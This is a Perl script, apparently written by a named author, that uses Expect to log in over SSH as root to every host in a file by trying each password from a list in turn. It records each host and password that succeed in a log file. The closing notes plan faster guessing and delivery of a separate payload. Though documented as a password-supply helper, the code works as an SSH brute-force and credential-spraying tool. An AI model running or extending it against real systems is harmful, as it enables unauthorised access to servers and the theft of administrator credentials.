#!/usr/bin/perl -w

use warnings;
use strict;
use Pod::Usage;
use Getopt::Long;
use Expect;
use Tie::File;

=pod

=head1 NAME

ssh-expect.pl - Perl script to supply root/admin password for remote ssh server
and execute command. By default, ssh-expect.pl truncates and writes the session
information to $host-login.log.

=head1 SYNOPSIS

 This script may take up to three arguments to connect to remote server:

=over

=item -i --ipaddr   The file containing the hosts to be accessed.

Default: hosts.txt

=item -p --password The file containing the passwords to be used to access the hosts.

Default: pw.txt

=item -u --user     The username to be used to access the hosts.

Default: root

=item -o --outfile  The file used to record succesful logins and the password used.

Default: success.log

=item -v --verbose  Prints information, some of which may be useful.

Default: Non-verbose

=item -d --debug    Increases debugging level for Expect. Takes integers 0-3

Default: 0

=back

=head2 AUTHOR

Spencer J Sinn <ssinn@digitalriver.com>

=cut

# Variables
my $host;
my $passwd;
my @host;
my @passwd;
my $user;
my $password_file;
my $host_file;
my $outfile;
my $help;
my $verbose;
my $debug=0;

Getopt::Long::Configure ( 'auto_help', 'bundling' );
GetOptions (
	'u|user=s'     => \$user,
	'i|ipaddr=s'   => \$host_file,
	'p|pw=s'       => \$password_file,
	'o|outfile=s'  => \$outfile,
	'h|help'       => \$help,
	'v|verbose'    => \$verbose,
	'd|debug=i'    => \$debug,
) or warn pod2usage(2);

# Defines
unless ( $user ) {
	$user='root'
};
unless ( $password_file ) {
	$password_file="pw.txt"
};
unless ( $host_file ) {
	$host_file="hosts.txt"
};
unless ( $outfile ) {
	$outfile="success.log"
};

# Sanity testing
if ( ! -e $password_file ) {
	pod2usage(2);
	die "Couldn't open $password_file: $!"
};

if ( ! -e $host_file ) {
	pod2usage(2);
	die "Couldn't open $host_file: $!"
};

# Tie $password_file to an array
tie @passwd, 'Tie::File', $password_file
	or die "Couldn't open $password_file: $!";

# Tie $host_file to an array
 tie @host, 'Tie::File', $host_file
	or die "Couldn't open $host_file: $!";

# Step through the @host array
foreach $host (@host) {

	my $i=0;
	my $cmd="ssh -l $user $host";
	my $prompt="assword:";
	my $prompt1="\#";

	# For each hostname in the @host array, try a password
	# from the @passwd array. Step through each password.
	# When we run out of passwords, go to the next host.
	foreach $passwd (@passwd) {

	if ($verbose) {print "Host: $host\n";}
	if ($verbose) {print "Password: $passwd\n";}
		# now connect to remote UNIX box $host with given script to execute
		my $exp = Expect->spawn("$cmd")
			or die "Couldn't spawn $cmd: $!";
		
		$exp->log_file("$host-login.log", "w");
		$exp->raw_pty(1);
		$exp->debug($debug);
		
		$exp->expect(10,
			[ qr/\(yes\/no\)\?\s*$/
			=> sub {
				shift->send("yes\n");
				exp_continue;
			} ],
			[ $prompt
			=> sub {
				if ($verbose) {print "\nAttempt $i on host $host\n";}
				shift->send("$passwd\n");
				exp_continue;
			} ],
			[ '$prompt1'
			=> sub {
				open (LOGFILE, ">>$outfile")
					or warn "Couldn't write to $outfile";
				flock (LOGFILE, 2);
				print LOGFILE "Success on $host using $passwd\n";
				close (LOGFILE);
				shift->send("ps");
				sleep 1;
				exp_continue;
			} ],
			[ eof
			=> sub {
				shift->send("exit\n");
				sleep 1;
			} ] );
		$i++;
		shift;
	}
} # End of foreach

__END__

Notes:
2)	Can we have the alogorithm test 3 passwords out of the array at a time? 
		This would speed up the testing.
6)	Add an option for delivering a separate payload from a file, rather 
		than being bound to the confines of the script.
